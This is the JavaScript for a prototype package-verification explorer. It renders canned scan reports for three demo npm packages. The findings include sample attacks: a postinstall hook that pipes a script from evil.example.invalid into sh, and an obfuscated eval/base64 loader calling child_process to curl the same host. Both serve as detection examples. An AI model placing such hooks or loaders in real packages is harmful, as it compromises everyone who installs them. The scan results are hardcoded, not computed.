// VeriPack Interactive Prototype & Evidence Explorer

const DEMO_CASES = {
  clean_pkg: {
    package_name: "clean_pkg",
    version: "1.0.0",
    ecosystem: "npm",
    source_ref: "github.com/clean-pkg/clean_pkg@v1.0.0",
    archive_sha256: "0dacc9d403329473b7d30b749bd9ebc1f109945000b8485ae08a32f664ca3e12",
    provenance_verified: true,
    verdict: "SAFE",
    risk_score: 0,
    model_used: "qwen2.5-coder:7b (via Ollama)",
    summary_sentence: "All observed differences are verified as legitimate TypeScript compiler outputs; no capability escalation or backdoor detected.",
    summary_counts: {
      identical: 2,
      expected_artifacts: 1,
      stripped_dev_files: 1,
      suspicious: 0,
      critical: 0
    },
    coverage: {
      archive_integrity: "100% (Zip-Slip Checked)",
      source_resolution: "Level A — Exact Attested Commit",
      file_inventory: "4 files verified",
      manifest_checks: "Clean (0 lifecycle hooks)",
      ast_capabilities: "0 escalations",
      entropy_scale: "3.12 / 8.00 bits (Clean)",
      ai_explainer: "Active (qwen2.5-coder:7b)"
    },
    files: [
      {
        path: "dist/index.js",
        status: "EXPECTED_BUILD_ARTIFACT",
        severity: "INFO",
        source_mapped: "src/index.ts",
        entropy: 3.12,
        diff: `--- upstream: src/index.ts
+++ published: dist/index.js
@@ -1,3 +1,4 @@
+"use strict";
 export function add(a, b) {
   return a + b;
 }`,
        evidence: [
          "Maps faithfully to upstream TypeScript source: src/index.ts",
          "Exported symbols identical: ['add']",
          "0 new sensitive capabilities introduced (network: 0, process: 0, eval: 0)",
          "Entropy: 3.12 bits (Uniform clean transpiler output)"
        ],
        explanation: "Compiled output 'dist/index.js' faithfully maps to 'src/index.ts'. Standard CommonJS/ESM compilation artifacts verified with no capability escalation."
      },
      {
        path: "package.json",
        status: "IDENTICAL",
        severity: "INFO",
        source_mapped: "package.json",
        entropy: 2.85,
        diff: `--- upstream: package.json
+++ published: package.json
@@ (Identical files — 0 discrepancies)`,
        evidence: [
          "Exact SHA-256 hash match with upstream repository",
          "No preinstall or postinstall lifecycle scripts"
        ],
        explanation: "Package manifest is identical to the repository tag."
      },
      {
        path: "tests/index.test.ts",
        status: "DEV_ONLY_STRIPPED",
        severity: "INFO",
        source_mapped: "tests/index.test.ts",
        entropy: 2.45,
        diff: `--- upstream: tests/index.test.ts
+++ published: (File stripped in npm publication)`,
        evidence: [
          "Standard npm packaging behaviour: test suites stripped from published tarball",
          "Configured via .npmignore / package.json files array"
        ],
        explanation: "Development and test files were properly stripped before publication."
      }
    ]
  },

  tampered_manifest: {
    package_name: "tampered_manifest",
    version: "1.0.0",
    ecosystem: "npm",
    source_ref: "github.com/demo/tampered_manifest@v1.0.0",
    archive_sha256: "924a89e7c5e9c6611c2b7acef2a4e9286971bd332d948dee87bc7da32691ec7a",
    provenance_verified: false,
    verdict: "TAMPERED",
    risk_score: 75,
    model_used: "qwen2.5-coder:7b (via Ollama)",
    summary_sentence: "Unauthorized 'postinstall' execution hook injected into package.json which does not exist in the public Git repository.",
    summary_counts: {
      identical: 1,
      expected_artifacts: 0,
      stripped_dev_files: 0,
      suspicious: 2,
      critical: 0
    },
    coverage: {
      archive_integrity: "100% (Zip-Slip Checked)",
      source_resolution: "Level B — Strong Git Tag",
      file_inventory: "2 files verified",
      manifest_checks: "FAILED (Injected lifecycle hook)",
      ast_capabilities: "Network capability escalation",
      entropy_scale: "3.41 / 8.00 bits",
      ai_explainer: "Active (qwen2.5-coder:7b)"
    },
    files: [
      {
        path: "package.json",
        status: "SUSPICIOUS_MANIFEST",
        severity: "HIGH",
        source_mapped: "package.json",
        entropy: 3.41,
        diff: `--- upstream: package.json
+++ published: package.json
@@ -3,5 +3,6 @@
   "version": "1.0.0",
   "main": "index.js",
   "scripts": {
-    "test": "echo ok"
+    "test": "echo ok",
+    "postinstall": "curl -s https://evil.example.invalid/exfil.sh | sh"
   }
 }`,
        evidence: [
          "Lifecycle hook modified: postinstall injected",
          "Hook command: 'curl -s https://evil.example.invalid/exfil.sh | sh' (upstream was: None)",
          "Executes arbitrary remote shell script upon `npm install`"
        ],
        explanation: "CRITICAL MANIFEST TAMPERING: An unauthorized 'postinstall' script was inserted into package.json during publishing. This script downloads and executes untrusted code immediately upon installation."
      },
      {
        path: "index.js",
        status: "IDENTICAL",
        severity: "INFO",
        source_mapped: "index.js",
        entropy: 2.10,
        diff: `--- upstream: index.js
+++ published: index.js
@@ (Identical files)`,
        evidence: [
          "Payload logic in main entrypoint unmodified"
        ],
        explanation: "Entrypoint logic is identical. Attack is concentrated exclusively in installation lifecycle scripts."
      }
    ]
  },

  ghost_backdoor: {
    package_name: "ghost_backdoor",
    version: "1.0.0",
    ecosystem: "npm",
    source_ref: "github.com/security-demo/ghost_backdoor@v1.0.0",
    archive_sha256: "a18dc1f3afbf452c5efbe10d4ce452ab4f24018c0b81f18cad798c1384eeec02",
    provenance_verified: false,
    verdict: "COMPROMISED",
    risk_score: 100,
    model_used: "qwen2.5-coder:7b (via Ollama)",
    summary_sentence: "Unmapped executable ghost file 'lib/x.min.js' with high Shannon entropy (5.44) and dynamic base64 child_process execution detected.",
    summary_counts: {
      identical: 2,
      expected_artifacts: 0,
      stripped_dev_files: 0,
      suspicious: 0,
      critical: 1
    },
    coverage: {
      archive_integrity: "100% (Zip-Slip Checked)",
      source_resolution: "Level B — Strong Git Tag",
      file_inventory: "3 files verified",
      manifest_checks: "Clean",
      ast_capabilities: "ESCALATION: child_process + eval",
      entropy_scale: "5.44 / 8.00 bits (CRITICAL)",
      ai_explainer: "Active (qwen2.5-coder:7b)"
    },
    files: [
      {
        path: "lib/x.min.js",
        status: "UNMAPPED_GHOST_FILE",
        severity: "CRITICAL",
        source_mapped: "None (Ghost File)",
        entropy: 5.44,
        diff: `--- upstream: (Does not exist in Git repository)
+++ published: lib/x.min.js
@@ +1,3 @@
+var _0x4f2a=['\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73','\\x65\\x78\\x65\\x63'];
+eval(Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgaHR0cHM6Ly9ldmlsLmV4YW1wbGUuaW52YWxpZCcp','base64').toString());`,
        evidence: [
          "Orphan file present in published tarball with zero Git repository counterpart",
          "Shannon byte entropy: 5.44 bits (High obfuscation indicator)",
          "Hex-escaped string table pattern: _0x4f2a=['\\x63\\x68\\x69\\x6c...']",
          "Dynamic execution sink: eval()",
          "Covert capability extraction: child_process.exec via Base64 decoding"
        ],
        explanation: "SUPPLY-CHAIN BACKDOOR: Ghost file 'lib/x.min.js' was slipped into the published package. High entropy and obfuscated execution of child_process indicate a malicious payload resembling the event-stream / ua-parser-js incidents."
      },
      {
        path: "index.js",
        status: "IDENTICAL",
        severity: "INFO",
        source_mapped: "index.js",
        entropy: 2.21,
        diff: `--- upstream: index.js
+++ published: index.js
@@ (Identical files)`,
        evidence: [
          "Legitimate entrypoint unmodified"
        ],
        explanation: "Unmodified entrypoint used as decoy."
      },
      {
        path: "package.json",
        status: "IDENTICAL",
        severity: "INFO",
        source_mapped: "package.json",
        entropy: 2.78,
        diff: `--- upstream: package.json
+++ published: package.json
@@ (Identical files)`,
        evidence: [
          "Manifest hash identical"
        ],
        explanation: "Package manifest is identical."
      }
    ]
  }
};

let currentReport = null;
let selectedFileIndex = 0;

function selectPreset(presetKey) {
  const pkgInput = document.getElementById("package-input");
  if (presetKey === "clean_pkg") {
    pkgInput.value = "clean_pkg@1.0.0";
  } else if (presetKey === "tampered_manifest") {
    pkgInput.value = "tampered_manifest@1.0.0";
  } else if (presetKey === "ghost_backdoor") {
    pkgInput.value = "ghost_backdoor@1.0.0";
  }
  startScan(presetKey);
}

function startScan(forcedPreset = null) {
  const inputVal = document.getElementById("package-input").value.trim();
  let key = forcedPreset;
  if (!key) {
    if (inputVal.includes("tamper")) key = "tampered_manifest";
    else if (inputVal.includes("ghost") || inputVal.includes("backdoor")) key = "ghost_backdoor";
    else key = "clean_pkg";
  }

  const progressCard = document.getElementById("progress-card");
  const resultCard = document.getElementById("result-card");
  const explorerCard = document.getElementById("explorer-card");

  progressCard.style.display = "block";
  resultCard.style.display = "none";
  explorerCard.style.display = "none";

  const steps = [
    document.getElementById("step-1"),
    document.getElementById("step-2"),
    document.getElementById("step-3"),
    document.getElementById("step-4"),
    document.getElementById("step-5"),
    document.getElementById("step-6")
  ];

  // Reset steps
  steps.forEach(s => {
    s.className = "step-item";
    s.querySelector(".step-status").innerHTML = `<div class="step-spinner"></div>`;
  });

  let currentStep = 0;
  function advance() {
    if (currentStep > 0) {
      steps[currentStep - 1].className = "step-item done";
      steps[currentStep - 1].querySelector(".step-status").innerHTML = "✓";
    }
    if (currentStep < steps.length) {
      steps[currentStep].className = "step-item active";
      currentStep++;
      setTimeout(advance, 220);
    } else {
      setTimeout(() => {
        progressCard.style.display = "none";
        renderReport(DEMO_CASES[key]);
      }, 300);
    }
  }
  advance();
}

function renderReport(report) {
  currentReport = report;
  selectedFileIndex = 0;

  const resultCard = document.getElementById("result-card");
  const explorerCard = document.getElementById("explorer-card");
  resultCard.style.display = "flex";
  explorerCard.style.display = "grid";

  // Verdict banner
  const verdictTag = document.getElementById("verdict-tag");
  verdictTag.className = `verdict-tag ${report.verdict}`;
  verdictTag.textContent = report.verdict;

  document.getElementById("verdict-summary").textContent = report.summary_sentence;
  document.getElementById("score-value").textContent = `${report.risk_score}/100`;

  // Metadata Grid
  document.getElementById("meta-pkg").textContent = `${report.package_name}@${report.version}`;
  document.getElementById("meta-sha").textContent = report.archive_sha256.substring(0, 16) + "...";
  document.getElementById("meta-sha").title = report.archive_sha256;
  document.getElementById("meta-source").textContent = report.source_ref;
  document.getElementById("meta-model").textContent = report.model_used;

  // Coverage Strip
  const strip = document.getElementById("coverage-strip");
  strip.innerHTML = `
    <div class="coverage-pill">Archive: <strong>${report.coverage.archive_integrity}</strong></div>
    <div class="coverage-pill">Resolution: <strong>${report.coverage.source_resolution}</strong></div>
    <div class="coverage-pill">Inventory: <strong>${report.coverage.file_inventory}</strong></div>
    <div class="coverage-pill">Manifest: <strong>${report.coverage.manifest_checks}</strong></div>
    <div class="coverage-pill">Capabilities: <strong>${report.coverage.ast_capabilities}</strong></div>
    <div class="coverage-pill">Entropy: <strong>${report.coverage.entropy_scale}</strong></div>
  `;

  // Render Files
  renderFileList();
  renderSelectedFile();
}

function renderFileList() {
  const fileList = document.getElementById("file-list");
  fileList.innerHTML = "";

  currentReport.files.forEach((file, index) => {
    const item = document.createElement("div");
    item.className = `file-item ${index === selectedFileIndex ? "selected" : ""}`;
    let chipClass = "chip-safe";
    if (file.status.includes("TAMPERED") || file.status.includes("MANIFEST")) chipClass = "chip-tampered";
    if (file.status.includes("GHOST") || file.status.includes("COMPROMISED") || file.severity === "CRITICAL") chipClass = "chip-compromised";

    item.innerHTML = `
      <span>${file.path}</span>
      <span class="chip-status ${chipClass}">${file.status}</span>
    `;
    item.onclick = () => {
      selectedFileIndex = index;
      renderFileList();
      renderSelectedFile();
    };
    fileList.appendChild(item);
  });
}

function renderSelectedFile() {
  const file = currentReport.files[selectedFileIndex];
  if (!file) return;

  // Diff Pane
  const diffViewer = document.getElementById("diff-viewer");
  let htmlDiff = "";
  file.diff.split("\n").forEach(line => {
    if (line.startsWith("+")) {
      htmlDiff += `<span class="diff-add">${escapeHtml(line)}</span>`;
    } else if (line.startsWith("-")) {
      htmlDiff += `<span class="diff-del">${escapeHtml(line)}</span>`;
    } else {
      htmlDiff += `<span>${escapeHtml(line)}\n</span>`;
    }
  });
  diffViewer.innerHTML = htmlDiff;

  // Finding Details
  document.getElementById("finding-file").textContent = file.path;
  const sevEl = document.getElementById("finding-sev");
  sevEl.className = `finding-severity sev-${file.severity}`;
  sevEl.textContent = file.severity;

  document.getElementById("finding-entropy").textContent = file.entropy ? `${file.entropy.toFixed(2)} bits` : "N/A";
  document.getElementById("finding-mapping").textContent = file.source_mapped;

  const evList = document.getElementById("finding-evidence");
  evList.innerHTML = "";
  file.evidence.forEach(ev => {
    const li = document.createElement("li");
    li.className = "evidence-item";
    li.textContent = ev;
    evList.appendChild(li);
  });

  document.getElementById("qwen-explanation").textContent = file.explanation;
}

function escapeHtml(str) {
  return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function copyJsonReport() {
  if (!currentReport) return;
  navigator.clipboard.writeText(JSON.stringify(currentReport, null, 2));
  alert("VeriPack JSON report copied to clipboard!");
}

function downloadAdvisory() {
  if (!currentReport) return;
  const md = `# VeriPack Security Advisory: ${currentReport.package_name}@${currentReport.version}
**Verdict:** ${currentReport.verdict} (Risk Score: ${currentReport.risk_score}/100)  
**SHA-256:** ${currentReport.archive_sha256}  
**Upstream:** ${currentReport.source_ref}  
**AI Engine:** ${currentReport.model_used}  

## Summary
${currentReport.summary_sentence}

## Findings
${currentReport.files.map(f => `### [${f.severity}] ${f.path} -> ${f.status}
- **Entropy:** ${f.entropy ? f.entropy + ' bits' : 'N/A'}
- **Source Mapping:** ${f.source_mapped}
- **Evidence:**
${f.evidence.map(e => `  - ${e}`).join('\n')}
- **Explanation:** ${f.explanation}
`).join('\n')}
`;
  const blob = new Blob([md], { type: "text/markdown" });
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = `veripack-advisory-${currentReport.package_name}-${currentReport.version}.md`;
  a.click();
}

window.onload = () => {
  // Pre-load Case 3 (Ghost Backdoor) by default to show immediate high-impact evidence
  startScan("ghost_backdoor");
};
